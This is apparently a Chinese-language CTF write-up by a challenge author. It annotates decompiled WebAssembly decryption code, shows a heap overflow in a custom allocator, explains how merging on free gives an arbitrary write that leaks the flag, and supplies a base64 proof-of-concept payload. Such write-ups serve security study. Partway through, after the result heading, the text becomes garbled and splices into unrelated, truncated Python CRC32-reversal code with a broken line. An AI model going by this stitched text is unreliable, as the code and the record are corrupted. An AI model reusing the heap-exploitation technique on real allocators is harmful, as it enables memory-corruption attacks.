        set_local 1             // var_1 = hash(var_4, 16)
        get_local 4
        call free               // free(var_4);
        i32.const 0
        set_local 6             // var_6 = 0;
        block  ;; label = @1
          loop  ;; label = @2
            get_local 6
            i32.const 16
            i32.eq
            br_if 1 (;@1;)          // if(var_6 == 16) break;
            get_local 1
            get_local 6
            i32.add
            tee_local 5
            get_local 5
            i32.load8_u
            get_local 2
            get_local 6
            i32.add
            i32.load8_u
            i32.xor
            i32.store8          // 和之前一样(var_1 + var_6) ^= (var_2 + var_6);
            get_local 6
            i32.const 1
            i32.add
            set_local 6         // var_6 += 1;
            br 0 (;@2;)
          end
        end
        get_local 2
        call free               // free(var_2);
        get_local 1             // var_1
        get_local 0
        i32.const 16
        i32.add             // var_0 + 16
        get_local 3
        call malloc             // out = malloc(var_3);
        tee_local 6
        get_local 3             
        i32.const -16
        i32.add             // var_3 - 16
        tee_local 2             // var2 = var_3 - 16
        call mycrypt            // mycrypt(var_1 ,var_0 + 16, out, var_3 - 16)
        i32.const 0
        get_local 2
        i32.store offset=2680       // *(2680) = var_2;
        get_local 0
        call free               // free(var_0);
        get_local 6)
这样就翻译的差不多了，应该和我开始对加解密的描述差不多，可以发现，js层传入的data长度最长可以有0x1000个字节，但从decrypt函数可以看出data这只malloc了1024个字节，于是多出来的就造成了一个堆溢出，可以利用类似方式（手工）对其他函数包括malloc和free函数进行逆向，虽然工作会艰辛很多233。
接下来我们来看看如何利用，来看看开始的那几个malloc之后的layout
    heapbase:               flag
    key+32+12:              data
    data+1024+12:               pass
    pass+8+12:              random
可以看到data下面就是pass和random，除了flag没有被free（这是我觉得强行出题的一点。。。），下面的pass和random都会在用完之后被free，那么就想想怎么把flag
leak出来吧！
================================蛋疼的分割线=================================
=====接下来的部分可能对不了解堆内部的人很模糊，如果没看过源码或者自己逆过就别看了====
默认你已经知道这个堆和加解密部分的实现了。
可以想到的一个最简单的方式是让最后output指针malloc到flag前面，然后修改2680那个outsize到合适大小（如果大小超过了memory长度，不会反回结果）。问题是在于怎么实现，我们能做的：
  1. 在程序开始的时候溢出data块，能拿到两个可控的即将被free的堆块
  2. 最后修改outsize的时候只有一个操作就是free(data); 也就是得在free之后改掉2680那个size
做到这两点在glibc里应该是不可能的，但这个堆没有任何check。
做到这个的最关键的一点在merge的时候
    void free(unsigned char* ptr) {
        struct chunk* current = to_chunk(ptr);
        struct chunk* next = next_chunk(current);
        if(!(current->size & 1)) {
            struct chunk* pre = to_mem(current) - current->pre_size - 12;
            pre->size += ((current->size&0xfffffffe) + 12);
            // unlink pre
            unlink(pre);
            current = pre;
        }
        ...
    }
不会有任何的check，也就是我们能把当前的size加到prev块的size位上，但prev块的size位的位置是由当前堆块的pre_size位决定的，于是就能在前面任意位置加上当前size，只是这个size不能太大，不然在找当前块的下一块的时候会超出memory长度。
现在有任意写了，但有一个问题，要做到这点得把当前块的inuse位清0，而data块要改inuse位不容易。因为上面没有任何堆块，而且也不能拿两个能溢出的堆块中一个堆块改size，因为只能加上偶数的size，并不能改变size的inuse位。
没有堆块就自己创建堆块！free的时候会merge上面的堆块，然后merge之后的那个size我们是可控的，在free的最后，会清空下一块的inuse位然后设置pre_size
    // link current to bins
        int index = find_index(current->size);
        current->fd = bins[index];
        bins[index] = current;
        // clear next chunk's inuse bit and set the pre_size
        next = next_chunk(current);
        next->size &= 0xfffffffe;
        next->pre_size = current->size&0xfffffffe;
那么思路就出来了：
  1. 覆盖pass堆块，使其merge完的结果在data上面，同时设置data块的size字段
  2. 覆盖random堆块，设置data块的pre_size
  3. malloc output的结果会到key上面那段
  4. free data块的时候就能把size加到outsize，达到leak
然而实际操作中两个free的堆块在bins中的长度都会超过0x200然后分到最后一个链表，output会优先取random堆块free的那块。所以得把1，2的操作反一下。然后这题就解决了，可喜可贺（
ps：出题人没有源码大概也没法做出来
pps：写堆管理很有意思，出完题看着源码自己日自己写的题还日了一整天也很有意思
ppps：比赛完再逆一遍自己的题不容易，各位要打出题人的请手下留情orz
poc：
    MTIzNDU2NzgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJD1AAD8AwAAAAAAAGFhYWFhYWFhXAQAAJgIAAAAAAAA
结果：
    n&Atoe.^S;cd3>= 1
                        i ^= poly
                    else:
                        i >>= 1
                self.table.append(i)
            assert len(self.table) == 256, "table is wrong size"
            # build reverse table
            if reverse:
                found_none = set()
                found_multiple = set()
                for i in range(256):
                    found = []
                    for j in range(256):
                        if self.table[j] >> 24 == i:
                            found.append(j)
                    self.table_reverse.append(tuple(found))
                    if not found:
                        found_none.add(i)
                    elif len(found) > 1:
                        found_multiple.add(i)
                assert len(self.table_reverse) == 256, "reverse table is wrong size"
        def rangess(self, i):
            return ', '.join(map(lambda x: '[{0},{1}]'.format(*x), self.ranges(i)))
        def ranges(self, i):
            for kg in itertools.groupby(enumerate(i), lambda x: x[1] - x[0]):
                g = list(kg[1])
                yield g[0][7], g[-1][8]
        def calc(self, data, accum=0):
            accum = ~accum
            for b in data:
                accum = self.table[(accum ^ b) & 0xFF] ^ ((accum >> 8) & 0x00FFFFFF)
            accum = ~accum
            return accum & 0xFFFFFFFF
        def findReverse(self, desired, accum):
            solutions = set()
            accum = ~accum
            stack = [(~desired,)]
            while stack:
                node = stack.pop()
                for j in self.table_reverse[(node[0] >> 24) & 0xFF]:
                    if len(node) == 4:
                        a = accum
                        data = []
                        node = node[1:] + (j,)
                        for i in range(3, -1, -1):
                            data.append((a ^ node[i]) & 0xFF)
                            a >>= 8
                            a ^= self.table[node[i]]
                        solutions.add(tuple(data))
                    else:
                        stack.append(((node[0] ^ self.table[j]) = 4:
                patches = self.findReverse(desired, accum)
                for patch in patches:
                    checksum = self.calc(patch, accum)
                    print 'verification checksum: 0x{0:08x} ({1})'.format(
                        checksum, 'OK' if checksum == desired else 'ERROR')
                for item in self.dfs(self.length - 4):
                    patch = map(ord, item)
                    patches = self.findReverse(desired, self.calc(patch, accum))
                    for last_4_bytes in patches:
                        if all(p in self.char_set for p in last_4_bytes):
                            patch.extend(last_4_bytes)
                            print '[find]: {1} ({0})'.format(
                                'OK' if self.calc(patch, accum) == desired else 'ERROR', ''.join(map(chr, patch)))
            else:
                for item in self.dfs(self.length):
                    if crc32(item) == desired:
                        print '[find]: {0} (OK)'.format(item)
    def crc32_reverse(crc32, length, char_set=string.printable,
                      poly=0xEDB88320, accum=0):
        '''
        :param crc32: the crc32 you wnat to reverse
        :param length: the plaintext length
        :param char_set: char_set